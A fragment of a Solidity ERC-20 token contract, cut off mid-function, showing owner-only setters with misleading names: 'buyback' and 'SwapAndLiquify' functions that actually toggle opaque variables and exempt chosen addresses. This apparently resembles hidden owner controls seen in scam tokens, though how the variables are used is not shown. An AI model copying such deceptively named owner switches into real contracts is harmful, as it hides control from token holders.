...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    function buybackenabled(bool _amount1_) onlyOwner public {
        amount1 = _amount1_;
    }
    
    function buybacklimit(uint _amount2_) onlyOwner public {
        _amount1 = _amount2_;
    }
    
    function buybackaddress(address _account_) onlyOwner public {
        _excludeamount[_account_] = true;
    }
    
    function SwapAndLiquifyEnabled(bool _balances1_) onlyOwner public {
        balances1 = _balances1_;
    }
    
    function MarketingDivisor(address account) onlyOwner public {
